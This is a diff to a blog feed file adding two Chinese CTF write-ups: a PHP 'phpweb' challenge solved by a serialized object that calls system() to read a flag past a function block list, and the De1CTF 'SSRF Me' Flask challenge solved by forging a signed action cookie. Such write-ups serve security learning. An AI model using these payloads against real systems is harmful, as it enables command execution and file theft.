@@ -4,6 +4,44 @@
   
   
   <entry>
+    <title>BUU每日一题039</title>
+    <link href="/2021/02/27/BUU039/"/>
+    <url>/2021/02/27/BUU039/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[网鼎杯 2020 朱雀组]phpweb<img src="https://ftp.bmp.ovh/imgs/2021/02/fc3331b9a95a064c.png">        </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一段报错信息      </p><pre><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 242021-02-27 06:14:05 am        </code></pre><p>而且没五秒页面会刷新一次<br>抓包看看<img src="https://ftp.bmp.ovh/imgs/2021/02/0efeb58411f3be9b.png"><br>前面一个date,后面是时间—–函数执行<br>读取<code>index.php</code><br><code>func=file_get_contents&amp;p=index.php</code>       </p><pre><code>&lt;?php    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);    function gettime($func, $p) &#123;        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == &quot;string&quot;) &#123;            return $result;        &#125; else &#123;return &quot;&quot;;&#125;    &#125;    class Test &#123;        var $p = &quot;Y-m-d h:i:s a&quot;;        var $func = &quot;date&quot;;        function __destruct() &#123;            if ($this-&gt;func != &quot;&quot;) &#123;                echo gettime($this-&gt;func, $this-&gt;p);            &#125;        &#125;    &#125;    $func = $_REQUEST[&quot;func&quot;];    $p = $_REQUEST[&quot;p&quot;];    if ($func != null) &#123;        $func = strtolower($func);        if (!in_array($func,$disable_fun)) &#123;            echo gettime($func, $p);        &#125;else &#123;            die(&quot;Hacker...&quot;);        &#125;    &#125;    ?&gt;       </code></pre><p>可以看到禁了很多函数<br>有个class<br>可以用反序列<code>unserialize</code>函数      </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><pre><code>&lt;?phpclass Test &#123;    //var $p = &quot;find / -name &#39;flag*&#39;&quot;;    //var $p = &quot;ls /&quot;;    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;    var $func = &quot;system&quot;;&#125;$a=new Test();$b=serialize($a);echo $b;       </code></pre><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>序列化</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>BUU每日一题038</title>
+    <link href="/2021/02/26/BUU038/"/>
+    <url>/2021/02/26/BUU038/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[De1CTF 2019]SSRF Me<br>hint：<code>flag is in ./flag.txt</code>         </p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><pre><code>#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app = Flask(__name__)secert_key = os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):         ##函数--各个定义        self.action = action        self.param = param        self.sign = sign        self.sandbox = md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)    def Exec(self):         ##函数        result = &#123;&#125;        result[&#39;code&#39;] = 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)                resp = scan(self.param)      ##扫描目录                if (resp == &quot;Connection Timeout&quot;):                    result[&#39;data&#39;] = resp                else:                    print resp                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] = 200            if &quot;read&quot; in self.action:                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)                result[&#39;code&#39;] = 200                result[&#39;data&#39;] = f.read()       ##读取            if result[&#39;code&#39;] == 500:                result[&#39;data&#39;] = &quot;Action Error&quot;        else:            result[&#39;code&#39;] = 500            result[&#39;msg&#39;] = &quot;Sign Error&quot;        return result    def checkSign(self):          ##检查        if (getSign(self.action, self.param) == self.sign):            return True        else:            return False#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])                 ##路由1----&gt;对传参加密def geneSign():    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    action = &quot;scan&quot;    return getSign(action, param)@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])              ##路由2------&gt;执行def challenge():    action = urllib.unquote(request.cookies.get(&quot;action&quot;))    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip = request.remote_addr    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task = Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#39;/&#39;)        ##路由3----&gt;首页def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):        ##加密函数    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):    check=param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ == &#39;__main__&#39;:    app.debug = False    app.run(host=&#39;0.0.0.0&#39;)         </code></pre><p>利用点：     </p><pre><code>result[&#39;data&#39;] = f.read()        </code></pre><p>前提是action里有read和scan,还要通过检查<br>可以通过路由1获得加密后的sign<br><code>geneSign()</code>里<code>action=&quot;scan&quot;</code>所以我们要在param里加上read<br>获得sign后<br>在路由2里修改cookie传参即可        </p><h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：</p><pre><code>/geneSign?param=flag.txtread       </code></pre><p>得到sign:<code>411d8c10d1b90c5c4e39c1904652f8c0</code>       </p><pre><code>/De1ta?param=flag.txt      cookie: action=readscan;sign=411d8c10d1b90c5c4e39c1904652f8c0        </code></pre><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>flask代码审计<br>虽然看了看flask的基本知识，但看到一大段代码时总抓不到重点，还要多看看     </p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题037</title>
     <link href="/2021/02/25/BUU037/"/>
     <url>/2021/02/25/BUU037/</url>
